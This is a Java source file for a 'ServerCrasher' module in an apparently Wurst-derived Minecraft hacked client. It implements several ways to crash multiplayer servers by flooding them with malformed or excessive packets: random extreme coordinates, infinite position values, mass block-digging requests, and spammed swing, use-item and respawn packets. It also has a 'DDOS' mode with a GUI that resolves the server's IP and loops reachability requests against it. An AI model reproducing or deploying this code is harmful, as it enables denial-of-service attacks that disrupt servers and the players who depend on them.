/*
 * Copyright (C) 2017 - 2019 | Wurst-Imperium | All rights reserved.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.forge.hacks.world;

import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.*;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.common.util.PacketUtil;
import net.minecraftforge.fml.common.eventhandler.Event;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.wurstclient.forge.Category;
import net.wurstclient.forge.Hack;
import net.wurstclient.forge.settings.CheckboxSetting;
import net.wurstclient.forge.settings.EnumSetting;
import net.wurstclient.forge.settings.SliderSetting;
import net.wurstclient.forge.utils.ChatUtils;

import javax.swing.*;
import java.awt.*;
import java.io.IOException;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.UnknownHostException;
import java.util.Objects;

public final class ServerCrasher extends Hack {

	private final SliderSetting strength =
			new SliderSetting("Strength", "How strong are the crashers? To high may kick you.", 500, 5, 1000000, 5, SliderSetting.ValueDisplay.DECIMAL);

	private final CheckboxSetting antilag =
			new CheckboxSetting("Anti lag", "prevents lag when crashing servers.",
					false);

	public final EnumSetting<Mode> mode =
			new EnumSetting<>("Mode", Mode.values(), Mode.SWING);
	private JFrame jFrame;
	private JPanel jPanel;
	private JLabel domainLabel;
	private JToggleButton jToggleButton;
	private JTextField domainTextField;
	private JLabel consoleLabel;
	private JTextField ipTextField;

	private enum Mode {
		AACNEW("AACNew", true, false, false, false, false, false, false),
		AACOLD("AACOld", false, true, false, false, false, false, false),
		NOCOM("NoCom", false, false, true, false, false, false, false),
		SWING("Swing", false, false, false, true, false, false, false),
		SWINGV2("Swingv2", false, false, false, false, true, false, false),
		OTHER("Other", false, false, false, false, false, true, false),
		DDOS("DDOS", false, false, false, false, false, false, true);

		private final String name;
		private final boolean aacnew;
		private final boolean aacold;
		private final boolean nocom;
		private final boolean swing;
		private final boolean swingv2;
		private final boolean other;
		private final boolean ddos;

		private Mode(String name, boolean aacnew, boolean aacold, boolean nocom, boolean swing, boolean swingv2, boolean other, boolean ddos) {
			this.name = name;
			this.aacnew = aacnew;
			this.aacold = aacold;
			this.nocom = nocom;
			this.swing = swing;
			this.swingv2 = swingv2;
			this.other = other;
			this.ddos = ddos;
		}

		public String toString() {
			return name;
		}
	}

	private final CheckboxSetting disOnEnable =
			new CheckboxSetting("DisableOnEnable", "Disables module once enabled",
					false);

	public ServerCrasher() {
		super("ServerCrasher", "Lots of methods to crash a server.");
		setCategory(Category.WORLD);
		addSetting(strength);
		addSetting(antilag);
		addSetting(mode);
		addSetting(disOnEnable);
	}

	@Override
	protected void onEnable() {
		MinecraftForge.EVENT_BUS.register(this);
		if (mode.getSelected().ddos) {
			jFrame = new JFrame("Fallen ServerCrasher | DDOS");
			jPanel = new JPanel(new GridLayout());

			domainLabel = new JLabel("Enter Domain and IP:");
			domainTextField = new JTextField(Objects.requireNonNull(mc.getCurrentServerData()).serverIP, 4);

			jToggleButton = new JToggleButton("Engage");
			jPanel.add(jToggleButton);

			consoleLabel = new JLabel();

			try {
				ipTextField = new JTextField(domToIP(Objects.requireNonNull(mc.getCurrentServerData()).serverIP), 4);
			} catch (UnknownHostException e) {
				e.printStackTrace();
			}

			jPanel.add(consoleLabel);
			jPanel.add(domainLabel);
			jPanel.add(domainTextField);
			jPanel.add(ipTextField);

			domainLabel.setSize(200, 200);
			domainTextField.setSize(200, 200);

			jFrame.add(jPanel);
			jFrame.setVisible(true);
		}
	}

	@Override
	protected void onDisable() {
		MinecraftForge.EVENT_BUS.unregister(this);
		if (antilag.isChecked()) {
			mc.gameSettings.renderDistanceChunks = 1;
		}
	}

	@SubscribeEvent
	public void onUpdate(Event event) throws IOException {
		if (mc.world == null || mc.player == null || disOnEnable.isChecked()) {
			setEnabled(false);
		}

		if (antilag.isChecked()) {
			mc.gameSettings.renderDistanceChunks = 0;
		}

		for (int x = 0; x < strength.getValueF(); x++) {
			if (mode.getSelected().aacnew) {
				double a = Math.round(Math.random() * Integer.MAX_VALUE) - Math.round(Math.random() * Integer.MAX_VALUE);
				double b = 64;
				double c = Math.round(Math.random() * Integer.MAX_VALUE) - Math.round(Math.random() * Integer.MAX_VALUE);
				mc.player.connection.sendPacket(new CPacketPlayer.Position(a, b, c, true));
			} else if (mode.getSelected().aacold) {
				double v;
				if (mc.player.ticksExisted % 2 == 0) {
					v = Double.NEGATIVE_INFINITY;
				} else {
					v = Double.POSITIVE_INFINITY;
				}
				mc.player.connection.sendPacket(new CPacketPlayer.Position(v, v, v, true));
			} else if (mode.getSelected().nocom) {
				double a = Math.round(Math.random() * Integer.MAX_VALUE) - Math.round(Math.random() * Integer.MAX_VALUE);
				double b = 64;
				double c = Math.round(Math.random() * Integer.MAX_VALUE) - Math.round(Math.random() * Integer.MAX_VALUE);
				mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.START_DESTROY_BLOCK, new BlockPos(a, b, c), EnumFacing.DOWN));
			} else if (mode.getSelected().swing) {
				mc.player.connection.sendPacket(new CPacketAnimation(EnumHand.MAIN_HAND));
			} else if (mode.getSelected().swingv2) {
				mc.player.connection.sendPacket(new CPacketPlayerTryUseItem(EnumHand.MAIN_HAND));
			} else if (mode.getSelected().other) {
				mc.player.connection.sendPacket(new CPacketClientStatus(CPacketClientStatus.State.REQUEST_STATS));
				mc.player.connection.sendPacket(new CPacketClientStatus(CPacketClientStatus.State.PERFORM_RESPAWN));
			}
		}
		if (mode.getSelected().ddos) {
			try {
				if (jToggleButton.getModel().isSelected()) {
					String domainLabelText = domainLabel.getText();
					String ip = ipTextField.getText();
					for (int a = 0; a < strength.getValueF(); a++) {
						sendPacket(domainLabelText, ip);
					}
					consoleLabel.setText("Okay, were active. Minecraft may be un-responsive but thats okay, If anti-lag is \n " +
							"enabled we will prioritize the runtime. Here is some information: " + "\n " +
							"Ping: " + Objects.requireNonNull(mc.getCurrentServerData()).pingToServer + "\n " +
							"HasPinged: " + mc.getCurrentServerData().pinged);
				} else {
					consoleLabel.setText("This is the console, information will appear here once engaged. [" + "Possible Server IP: " + domToIP(Objects.requireNonNull(mc.getCurrentServerData()).serverIP) + "]");
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		ipTextField.setToolTipText("Enter IP here.");
		domainTextField.setToolTipText("Enter Domain here.");
		consoleLabel.setToolTipText("Console");
		jToggleButton.setToolTipText("Start the DDOS attack.");
	}


	public void sendPacket(String hostname, String ip) {
		try {
			InetAddress inetAddress = InetAddress.getByName(hostname);
			InetAddress inetAddress1 = InetAddress.getByName(ip);

			boolean a = inetAddress.isReachable(NetworkInterface.getByInetAddress(inetAddress), Integer.MAX_VALUE, Integer.MAX_VALUE);
			boolean b = inetAddress1.isReachable(NetworkInterface.getByInetAddress(inetAddress1), Integer.MAX_VALUE, Integer.MAX_VALUE);

			if(a){}
			if(b){}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public String domToIP(String domain) throws UnknownHostException {
		try {
			InetAddress inetAddress = InetAddress.getByName(domain);
			return inetAddress.getHostAddress();
		} catch (UnknownHostException e) {
			e.printStackTrace();
			setEnabled(false);
			try {
				ChatUtils.error(e.getMessage());
			} catch (Exception exception) {
				exception.printStackTrace();
			}
		}
		return domain;
	}
}